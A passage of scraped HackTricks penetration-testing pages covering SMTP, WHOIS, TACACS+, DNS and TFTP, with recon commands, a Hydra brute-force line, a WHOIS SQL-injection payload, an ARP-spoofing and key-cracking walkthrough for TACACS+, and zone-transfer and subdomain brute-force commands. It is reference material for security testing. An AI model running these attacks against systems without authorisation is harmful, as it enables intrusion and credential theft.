email\nsmtp\n=\n\"127.0.0.1\"\ns\n=\nsmtplib\n.\nSMTP\n(\nsmtp\n)\ns\n.\nsendmail\n(\nsender\n,\n[\ndestination\n],\nmsg_data\n)\nMore info\nFind more information about these protections in\nhttps://seanthegeek.net/459/demystifying-dmarc/\n‚Äã\nOther phishing indicators\nDomain‚Äôs age\nLinks pointing to IP addresses\nLink manipulation techniques\nSuspicious (uncommon) attachments\nBroken email content\nValues used that are different to those of the mail headers\nExistence of a valid and trusted SSL certificate\nSubmission of the page to web content filtering sites\nExfiltration through SMTP\nIf you can send data via SMTP\nread this\n.\nConfig file\nPostfix\nUsually, if installed, in\n/etc/postfix/master.cf\ncontains\nscripts to execute\nwhen for example a new mail is receipted by a user. For example the line\nflags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}\nmeans that\n/etc/postfix/filtering\nwill be executed if a new mail is received by the user mark.\nOther config files:\nsendmail.cf\nsubmit.cf\nHackTricks Automatic Commands\nProtocol_Name: SMTP    #Protocol Abbreviation if there is one.\nPort_Number:  25,465,587     #Comma separated if there is more than one.\nProtocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for SMTP\nNote: |\nSMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-smtp\n‚Äã\nEntry_2:\nName: Banner Grab\nDescription: Grab SMTP Banner\nCommand: nc -vn {IP} 25\n‚Äã\nEntry_3:\nName: SMTP Vuln Scan\nDescription: SMTP Vuln Scan With Nmap\nCommand: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}\n‚Äã\nEntry_4:\nName: SMTP User Enum\nDescription: Enumerate uses with smtp-user-enum\nCommand: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}\n‚Äã\nEntry_5:\nName: SMTPS Connect\nDescription: Attempt to connect to SMTPS two different ways\nCommand: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587\n‚Äã\nEntry_6:\nName: Find MX Servers\nDescription: Find MX servers of an organization\nCommand: dig +short mx {Domain_Name}\n‚Äã\nEntry_7:\nName: Hydra Brute Force\nDescription: Need Nothing\nCommand: hydra -P {Big_Passwordlist} {IP} smtp -V\nEntry_8:\nName: consolesless mfs enumeration\nDescription: SMTP enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n23 - Pentesting Telnet\nNext\nSMTP - Commands\nLast modified\n6mo ago"
    },
    {
        "title": "43 - Pentesting WHOIS",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/43-pentesting-whois",
        "text": "43 - Pentesting WHOIS\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nWHOIS\n(pronounced as the phrase \"who is\") is a query and response protocol that is widely used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block or an autonomous system, but is also used for a wider range of other information. (From\nhere\n)\nDefault port:\n43\nPORT   STATE  SERVICE\n43/tcp open   whois?\nEnumerate\nGet all the information that a whois service has about a domain:\nwhois\n-h\n<\nHOST\n>\n-p\n<\nPORT\n>\n\"domain.tld\"\necho\n\"domain.ltd\"\n|\nnc\n-vn\n<\nHOST\n>\n<\nPORT\n>\nNotice than sometimes when requesting for some information to a WHOIS service the database being used appears in the response:\nAlso, the WHOIS service always needs to use a\ndatabase\nto store and extract the information. So, a possible\nSQLInjection\ncould be present when\nquerying\nthe database from some information provided by the user. For example doing:\nwhois -h 10.10.10.155 -p 43 \"a') or 1=1#\"\nyou could be able to\nextract all\nthe\ninformation\nsaved in the database.\nShodan\nport:43 whois\nHackTricks Automatic Commands\nProtocol_Name: WHOIS    #Protocol Abbreviation if there is one.\nPort_Number:  43     #Comma separated if there is more than one.\nProtocol_Description: WHOIS         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for WHOIS\nNote: |\nWHOIS (pronounced as the phrase \"who is\") is a query and response protocol that is widely used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block or an autonomous system, but is also used for a wider range of other information.\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-smtp\n‚Äã\nEntry_2:\nName: Banner Grab\nDescription: Grab WHOIS Banner\nCommand: whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nSMTP - Commands\nNext\n- Network Services Pentesting\n49 - Pentesting TACACS+\nLast modified\n6mo ago"
    },
    {
        "title": "49 - Pentesting TACACS+",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/49-pentesting-tacacs+",
        "text": "49 - Pentesting TACACS+\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nTerminal Access Controller Access Control System (TACACS)\nis a security protocol that provides centralized validation of users who are attempting to gain\naccess to a router or NAS\n. TACACS+, a more recent version of the original TACACS protocol, provides separate authentication, authorization, and accounting (AAA) services.\nPORT   STATE  SERVICE\n49/tcp open   tacacs\nDefault port:\n49\nIntercept Authentication Key\nIf an attacker manages to get in the middle between the client and the TACACS server,\nhe can intercept the authentication key\nin encrypted form and then do a local bruteforce against it. So you both bruteforce the key and you don‚Äôt show up in the logs. And if you manage to bruteforce the key,\nyou‚Äôll be able to access the network equipment and decrypt the traffic\nin\nWireshark\n.\nMitM\nIn order to perform a MitM attack you could use an\nARP spoofing attack\n.\nBrute-force Key\nNow you need to run\nLoki\n. This is a special tool designed to analyze the security of L2/L3 protocols. Its capabilities are just as good as those of the popular\nYersinia\nand it is a serious competitor to it. Loki can also bruteforce TACACS keys. If the key is successfully\nbruteforced\n(\nusually in MD5 encrypted format)\n,\nwe can access the equipment and decrypt the TACACS-encrypted traffic.\nsudo loki_gtk.py\nYou also need to specify the path to the dictionary in order to bruteforce the encrypted key. Be sure to uncheck the\nUse Bruteforce\noption, otherwise Loki will bruteforce the password without using the dictionary.\nNow we have to wait for an administrator to log into the device through the TACACS server. It is assumed that the network administrator has already logged in, and we,\nstanding in the middle via ARP spoofing\n, intercept the traffic. And in doing so, the legitimate hosts don‚Äôt realize that someone else has interfered with their connection.\nNow click the\nCRACK\nbutton and wait for\nLoki\nto break the password.\nDecrypt Traffic\nGreat, we managed to unlock the key, now we need to decrypt the TACACS traffic. As I said, Wireshark can handle encrypted TACACS traffic if the key is present.\nWe see which banner was used.\nWe find the username of the user\nadmin\nAs a result,\nwe have the\nadmin:secret1234\ncredentials,\nwhich can be used to access the hardware itself.\nI think I‚Äôll check their validity.\nThis is how you can attack TACACS+ and\ngain access\nto the control panel of network equipment.\nReferences\nThe interception key section was copied from\nhttps://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n43 - Pentesting WHOIS\nNext\n- Network Services Pentesting\n53 - Pentesting DNS\nLast modified\n6mo ago"
    },
    {
        "title": "53 - Pentesting DNS",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns",
        "text": "53 - Pentesting DNS\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\nBasic Information\nThe Domain Name Systems (DNS) is the phonebook of the Internet. Humans access information online through domain names, like nytimes.com or espn.com. Web browsers interact through Internet Protocol (IP) addresses. DNS translates domain names to\nIP addresses\nso browsers can load Internet resources.\nFrom\nhere\n.\nDefault port:\n53\nPORT     STATE SERVICE  REASON\n53/tcp   open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n5353/udp open  zeroconf udp-response\n53/udp   open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\nDifferent DNS Servers\nInformation from\nhttps://academy.hackthebox.com/module/112/section/1069\n‚Äã\nServer Type\nDescription\nDNS Root Server\nThe root servers of the DNS are responsible for the top-level domains (\nTLD\n). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The\nInternet Corporation for Assigned Names and Numbers\n(\nICANN\n) coordinates the work of the root name servers. There are\n13\nsuch root servers around the globe.\nAuthoritative Nameserver\nAuthoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point.\nNon-authoritative Nameserver\nNon-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.\nCaching DNS Server\nCaching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.\nForwarding Server\nForwarding servers perform only one function: they forward DNS queries to another DNS server.\nResolver\nResolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.\nEnumeration\nBanner Grabbing\nDNS does not have a \"banner\" to grab. The closest equivalent is a magic query for\nversion.bind. CHAOS TXT\nwhich will work on most BIND nameservers.\nYou can perform this query using\ndig\n:\ndig\nversion.bind CHAOS TXT @DNS\nIf that does not work you can use fingerprinting techniques to determine the remote server's version -- the\nfpdns\ntool is one option for that, but there are others.\nYou can grab the banner also with a\nnmap\nscript:\n--script dns-nsid\nAny record\nThe record\nANY\nwill ask the DNS server to\nreturn\nall the available\nentries\nthat\nit is willing to disclose\n.\ndig\nany victim.com @\n<\nDNS_IP\n>\nZone Transfer\nThis procedure is abbreviated\nAsynchronous Full Transfer Zone\n(\nAXFR\n).\ndig\naxfr @\n<\nDNS_IP\n>\n#Try zone transfer without domain\ndig\naxfr @\n<\nDNS_IP\n>\n<\nDOMAIN\n>\n#Try zone transfer guessing the domain\nfierce\n--domain\n<\nDOMAIN\n>\n--dns-servers\n<\nDNS_IP\n>\n#Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack\nMore info\ndig\nANY @\n<\nDNS_IP\n>\n<\nDOMAIN\n>\n#Any information\ndig\nA @\n<\nDNS_IP\n>\n<\nDOMAIN\n>\n#Regular DNS request\ndig\nAAAA @\n<\nDNS_IP\n>\n<\nDOMAIN\n>\n#IPv6 DNS request\ndig\nTXT @\n<\nDNS_IP\n>\n<\nDOMAIN\n>\n#Information\ndig\nMX @\n<\nDNS_IP\n>\n<\nDOMAIN\n>\n#Emails related\ndig\nNS @\n<\nDNS_IP\n>\n<\nDOMAIN\n>\n#DNS that resolves that name\ndig\n-x\n192.168\n.0.2 @\n<\nDNS_IP\n>\n#Reverse lookup\ndig\n-x\n2a00:1450:400c:c06::93 @\n<\nDNS_IP\n>\n#reverse IPv6 lookup\n‚Äã\n#Use [-p PORT]  or  -6 (to use ivp6 address of dns)\nAutmation\nfor\nsub\nin\n$(\ncat\n<\nWORDLIST\n>\n)\n;\ndo\ndig\n$sub\n.\n<\nDOMAIN\n>\n@\n<\nDNS_IP\n>\n|\ngrep\n-v\n';\\|SOA'\n|\nsed\n-r\n'/^\\s*$/d'\n|\ngrep\n$sub\n|\ntee\n-a\nsubdomains.txt\n;\ndone\n‚Äã\ndnsenum\n--dnsserver\n<\nDNS_IP\n>\n--enum\n-p\n0\n-s\n0\n-o\nsubdomains.txt\n-f\n<\nWORDLIST\n>\n<\nDOMAIN\n>\nUsing nslookup\nnslookup\n>\nSERVER\n<\nIP_DNS\n>\n#Select dns server\n>\n127.0\n.0.1\n#Reverse lookup of 127.0.0.1, maybe...\n>\n<\nIP_MACHINE\n>\n#Reverse lookup of a machine, maybe...\nUseful metasploit modules\nauxiliary/gather/enum_dns\n#Perform enumeration actions\nUseful nmap scripts\n#Perform enumeration actions\nnmap\n-n\n--script\n\"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\"\n<\nIP\n>\nDNS - Reverse BF\ndnsrecon\n-r\n127.0\n.0.0/24\n-n\n<\nIP_DNS\n>\n#DNS reverse of all of the addresses\ndnsrecon\n-r\n127.0\n.1.0/24\n-n\n<\nIP_DNS\n>\n#DNS reverse of all of the addresses\ndnsrecon\n-r\n<\nIP_DNS\n>\n/24\n-n\n<\nIP_DNS\n>\n#DNS reverse of all of the addresses\ndnsrecon\n-d\nactive.htb\n-a\n-n\n<\nIP_DNS\n>\n#Zone transfer\nIf you are able to find subdomains resolving to internal IP-addresses, you should try to perform a reverse dns BF to the NSs of the domain asking for that IP range.\nAnother tool to do so:\nhttps://github.com/amine7536/reverse-scan\n‚Äã\nYou can query reverse IP ranges to\nhttps://bgp.he.net/net/205.166.76.0/24#_dns\n(this tool is also helpful with BGP).\nDNS - Subdomains BF\ndnsenum\n--dnsserver\n<\nIP_DNS\n>\n--enum\n-p\n0\n-s\n0\n-o\nsubdomains.txt\n-f\nsubdomains-1000.txt\n<\nDOMAIN\n>\ndnsrecon\n-D\nsubdomains-1000.txt\n-d\n<\nDOMAIN\n>\n-n\n<\nIP_DNS\n>\ndnscan\n-d\n<\ndomain\n>\n-r\n-w\nsubdomains-1000.txt\n#Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan\nActive Directory servers\ndig\n-t\n_gc._tcp.lab.domain.com\ndig\n-t\n_ldap._tcp.lab.domain.com\ndig\n-t\n_kerberos._tcp.lab.domain.com\ndig\n-t\n_kpasswd._tcp.lab.domain.com\n‚Äã\nnslookup\n-type\n=\nsrv _kerberos._tcp.\n<\nCLIENT_DOMAIN\n>\nnslookup\n-type\n=\nsrv _kerberos._tcp.domain.com\n‚Äã\nnmap\n--script\ndns-srv-enum --script-args\n\"dns-srv-enum.domain='domain.com'\"\nDNSSec\n#Query paypal subdomains to ns3.isc-sns.info\nnmap\n-sSU\n-p53\n--script\ndns-nsec-enum --script-args dns-nsec-enum.domains\n=\npaypal.com ns3.isc-sns.info\nIPv6\nBrute force using \"AAAA\" requests to gather IPv6 of the subdomains.\ndnsdict6\n-s\n-t\n<\ndomain\n>\nBruteforce reverse DNS in using IPv6 addresses\ndnsrevenum6 pri.authdns.ripe.net\n2001\n:67c:2e8::/48\n#Will use the dns pri.authdns.ripe.net\nDNS Recursion DDoS\nIf\nDNS recursion is enabled\n, an attacker could\nspoof\nthe\norigin\non the UDP packet in order to make the\nDNS send the response to the victim server\n. An attacker could abuse\nANY\nor\nDNSSEC\nrecord types as they use to have the bigger responses.\nThe way to\ncheck\nif a DNS supports\nrecursion\nis to query a domain name and\ncheck\nif the\nflag \"ra\"\n(\nrecursion available\n) is in the response:\ndig\ngoogle.com A @\n<\nIP\n>\nNon available\n:\nAvailable\n:\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\nMail to nonexistent account\nFrom book: Network Security Assessment (3rd edition)\nSimply sending an email message to a nonexistent address at a target domain often reveals useful internal network information through a\nnondelivery notification\n(NDN).\nGenerating server: noa.nintendo.com\n‚Äã\n[email¬†protected]\n#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##\n‚Äã\nOriginal message headers:\n‚Äã\nReceived: from ONERDEDGE02.one.nintendo.com (10.13.20.35) by\nonerdexch08.one.nintendo.com (10.13.30.39) with Microsoft SMTP Server (TLS)\nid 14.3.174.1; Sat, 26 Apr 2014 16:52:22 -0700\nReceived: from barracuda.noa.nintendo.com (205.166.76.35) by\nONERDEDGE02.one.nintendo.com (10.13.20.35) with Microsoft SMTP Server (TLS)\nid 14.3.174.1; Sat, 26 Apr 2014 16:51:22 -0700\nX-ASG-Debug-ID: 1398556333-0614671716199b0d0001-zOQ9WJ\nReceived: from gateway05.websitewelcome.com (gateway05.websitewelcome.com  [69.93.154.37]) by\nbarracuda.noa.nintendo.com with ESMTP id xVNPkwaqGgdyH5Ag for <\n[email¬†protected]\n>; Sat,\n26 Apr 2014 16:52:13 -0700 (PDT)\nX-Barracuda-Envelope-From:\n[email¬†protected]\nX-Barracuda-Apparent-Source-IP: 69.93.154.37\nThe following data in this transcript is useful:\nInternal hostnames, IP addresses, and subdomain layout\nThe mail server is running Microsoft Exchange Server 2010 SP3\nA Barracuda Networks device is used to perform content filtering\nConfig files\nhost.conf\n/etc/resolv.conf\n/etc/bind/named.conf\n/etc/bind/named.conf.local\n/etc/bind/named.conf.options\n/etc/bind/named.conf.log\n/etc/bind/*\nDangerous settings when configuring a Bind server:\nOption\nDescription\nallow-query\nDefines which hosts are allowed to send requests to the DNS server.\nallow-recursion\nDefines which hosts are allowed to send recursive requests to the DNS server.\nallow-transfer\nDefines which hosts are allowed to receive zone transfers from the DNS server.\nzone-statistics\nCollects statistical data of zones.\nHackTricks Automatic Commands\nProtocol_Name: DNS    #Protocol Abbreviation if there is one.\nPort_Number:  53     #Comma separated if there is more than one.\nProtocol_Description: Domain Name Service        #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for DNS\nNote: |\n#These are the commands I run every time I see an open DNS port\n‚Äã\ndnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name}\ndnsrecon -r 127.0.1.0/24 -n {IP} -d {Domain_Name}\ndnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name}\ndig axfr @{IP}\ndig axfr {Domain_Name} @{IP}\nnslookup\nSERVER {IP}\n127.0.0.1\n{IP}\nDomain_Name\nexit\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-dns\n‚Äã\nEntry_2:\nName: Banner Grab\nDescription: Grab DNS Banner\nCommand: dig version.bind CHAOS TXT @DNS\n‚Äã\nEntry_3:\nName: Nmap Vuln Scan\nDescription: Scan for Vulnerabilities with Nmap\nCommand: nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" {IP}\n‚Äã\nEntry_4:\nName: Zone Transfer\nDescription: Three attempts at forcing a zone transfer\nCommand: dig axfr @{IP} && dix axfr @{IP} {Domain_Name} && fierce --dns-servers {IP} --domain {Domain_Name}\n‚Äã\n‚Äã\nEntry_5:\nName: Active Directory\nDescription: Eunuerate a DC via DNS\nCommand: dig -t _gc._{Domain_Name} && dig -t _ldap._{Domain_Name} && dig -t _kerberos._{Domain_Name} && dig -t _kpasswd._{Domain_Name} && nmap --script dns-srv-enum --script-args \"dns-srv-enum.domain={Domain_Name}\"\nEntry_6:\nName: consolesless mfs enumeration\nDescription: DNS enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/dns/dns_amp; set RHOSTS {IP}; set RPORT 53; run; exit' && msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS {IP}; set RPORT 53; run; exit'\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n49 - Pentesting TACACS+\nNext\n- Network Services Pentesting\n69/UDP TFTP/Bittorrent-tracker\nLast modified\n20d ago"
    },
    {
        "title": "69/UDP TFTP/Bittorrent-tracker",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp",
        "text": "69/UDP TFTP/Bittorrent-tracker\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nTFTP\nuses UDP port 69 and\nrequires no authentication\n‚Äîclients read from, and write to servers using the datagram format outlined in RFC 1350. Due to deficiencies within the protocol (namely lack of authentication and no transport security), it is uncommon to find servers on the public Internet. Within large internal networks, however, TFTP is used to serve configuration files and ROM images to VoIP handsets and other devices.\nTODO\n: Provide information about what is a Bittorrent-tracker (Shodan identifies this port with that name). PLEASE, LET ME KNOW IF YOU HAVE SOME INFORMATION ABOUT THIS IN THE\nHackTricks telegram group\n(or in a github issue in\nPEASS\n).\nDefault Port:\n69/UDP\nPORT   STATE SERVICE REASON\n69/udp open  tftp    script-set\nEnumeration\nTFTP doesn't provide directory listing so the script\ntftp-enum\nfrom\nnmap\nwill try to brute-force default paths.\nnmap\n-n\n-Pn\n-sU\n-p69\n-sV\n--script\ntftp-enum\n<\nIP\n>\nDownload/Upload\nYou can use Metasploit or Python to check if you can download/upload files:\nmsf\n5\n>\nauxiliary/admin/tftp/tftp_transfer_util\nimport\ntftpy\nclient\n=\ntftpy.TftpClient\n(\n<\nip\n>\n,\n<\nport\n>\n)\nclient.download\n(\n\"filename in server\"\n,\n\"/tmp/filename\"\n,\ntimeout\n=\n5\n)\nclient.upload\n(\n\"filename to upload\"\n,\n\"/local/path/file\"\n,\ntimeout\n=\n5\n)\nShodan\nport:69\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n53 - Pentesting DNS\nNext\n- Network Services Pentesting\n79 - Pentesting Finger\nLast modified\n6mo ago"
    },
    {
        "title": "79 - Pentesting Finger",
